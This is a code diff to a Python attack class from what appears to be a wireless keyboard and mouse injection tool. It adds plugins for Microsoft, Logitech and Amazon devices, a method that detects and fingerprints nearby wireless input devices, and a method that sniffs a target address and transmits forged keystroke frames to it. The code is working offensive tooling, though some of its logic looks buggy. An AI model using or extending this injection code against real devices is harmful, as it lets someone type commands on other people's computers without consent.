@@ -3,9 +3,13 @@
 file to hold class for attack management
 """
 import logging
+import os
 import time
+from jackit.plugins import microsoft, microsoft_enc, logitech, amazon
 
 import dongle
+
+plugins = [microsoft, microsoft_enc, logitech, amazon]
 
 
 class Attack(object):
@@ -39,7 +43,7 @@ class Attack(object):
         """
         return ':'.join('{:02X}'.format(x) for x in data)
 
-    def scan(self, callback, dwell_time: float = 0.1):
+    def scan(self, callback=None, dwell_time: float = 0.1):
         """
         scan frequencies for target devices
         calls callback function everytime a device is found
@@ -100,3 +104,49 @@ class Attack(object):
                 logging.debug("ch: %02d addr: %s packet: %s" % (
                     self.channels[self.channel_index], self.to_display(address), self.to_display(payload)))
                 callback(address, payload)
+                if callback is None:
+                    return payload
+
+    def detect(self, callback=None):
+        """
+        detects devices nearby, higher level than sniff or scan
+        """
+
+        # noinspection PyUnusedLocal
+        def find_and_format_hid(channel, address, payload):
+            """
+            formats the hid and calls parent callback
+            """
+            hid = self.get_hid(payload)
+            if hid is None:
+                callback("Found an unknown device with address " + self.to_display(address) + " (payload: " + self.to_display(payload) + ")")
+            else:
+                callback("Found a " + hid.description() + " at address " + self.to_display(address))
+
+        self.scan(callback=find_and_format_hid)  # do the scan
+
+
+    @staticmethod
+    def get_hid(payload):
+        """
+        fingerprint a device from a given payload and return it's corresponding decoder/encoder class if it exists
+        """
+        if not payload:
+            logging.info("no payload detected")
+            return None
+        for hid in plugins:
+            if hid.HID.fingerprint(payload):
+                return hid.HID
+        return None
+
+    def inject(self, address, inject_string, dwell_time: float = 0.1, timeout: float = 5.0):
+        """
+        inject a string to an address
+        """
+        hid = self.get_hid(self.sniff(address, dwell_time=dwell_time, timeout=timeout))
+        hid.build_frames(inject_string)  # todo not sure if this code should be here
+        for key in inject_string:
+            if key['frames']:
+                for frame in key['frames']:
+                    self.current_dongle.transmit_payload(frame[0])
+                    time.sleep(frame[1] / 1000.0)
